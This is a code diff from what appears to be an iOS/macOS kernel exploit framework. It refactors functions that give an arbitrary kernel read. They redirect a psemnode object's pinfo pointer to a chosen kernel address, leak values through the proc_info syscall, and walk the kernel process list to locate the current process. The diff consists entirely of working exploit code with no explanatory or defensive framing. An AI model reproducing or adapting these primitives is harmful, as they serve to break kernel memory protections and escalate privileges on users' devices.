@@ -104,13 +104,13 @@ void kread_sem_open_find_proc(struct kfd* kfd)
      * Go backwards from the kernel_proc, which is the last proc in the list.
      */
     while (true) {
-        i32 pid = kget_u64(proc__p_pid, proc_kaddr);
+        i32 pid = dynamic_kget(proc, p_pid, proc_kaddr);
         if (pid == kfd->info.env.pid) {
             kfd->info.kernel.current_proc = proc_kaddr;
             break;
         }
 
-        proc_kaddr = kget_u64(proc__p_list__le_prev, proc_kaddr);
+        proc_kaddr = dynamic_kget(proc, p_list_le_prev, proc_kaddr);
     }
 }
 
@@ -142,9 +142,9 @@ u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr)
     i32 kread_fd = fds[kfd->kread.krkw_object_id];
     u64 psemnode_uaddr = kfd->kread.krkw_object_uaddr;
 
-    u64 old_pinfo = ((volatile struct psemnode*)(psemnode_uaddr))->pinfo;
-    u64 new_pinfo = kaddr - kfd_offset(pseminfo__psem_uid);
-    ((volatile struct psemnode*)(psemnode_uaddr))->pinfo = new_pinfo;
+    u64 old_pinfo = static_uget(psemnode, pinfo, psemnode_uaddr);
+    u64 new_pinfo = kaddr - static_offsetof(pseminfo, psem_uid);
+    static_uset(psemnode, pinfo, psemnode_uaddr, new_pinfo);
 
     struct psem_fdinfo data = {};
     i32 callnum = PROC_INFO_CALL_PIDFDINFO;
@@ -155,7 +155,7 @@ u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr)
     i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
     assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
 
-    ((volatile struct psemnode*)(psemnode_uaddr))->pinfo = old_pinfo;
+    static_uset(psemnode, pinfo, psemnode_uaddr, old_pinfo);
     return *(u64*)(&data.pseminfo.psem_stat.vst_uid);
 }
 
@@ -170,9 +170,9 @@ u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr)
     i32 kread_fd = fds[kfd->kread.krkw_object_id];
     u64 psemnode_uaddr = kfd->kread.krkw_object_uaddr;
 
-    u64 old_pinfo = ((volatile struct psemnode*)(psemnode_uaddr))->pinfo;
-    u64 new_pinfo = kaddr - kfd_offset(pseminfo__psem_usecount);
-    ((volatile struct psemnode*)(psemnode_uaddr))->pinfo = new_pinfo;
+    u64 old_pinfo = static_uget(psemnode, pinfo, psemnode_uaddr);
+    u64 new_pinfo = kaddr - static_offsetof(pseminfo, psem_usecount);
+    static_uset(psemnode, pinfo, psemnode_uaddr, new_pinfo);
 
     struct psem_fdinfo data = {};
     i32 callnum = PROC_INFO_CALL_PIDFDINFO;
@@ -183,7 +183,7 @@ u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr)
     i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
     assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
 
-    ((volatile struct psemnode*)(psemnode_uaddr))->pinfo = old_pinfo;
+    static_uset(psemnode, pinfo, psemnode_uaddr, old_pinfo);
     return *(u32*)(&data.pseminfo.psem_stat.vst_size);
 }
 
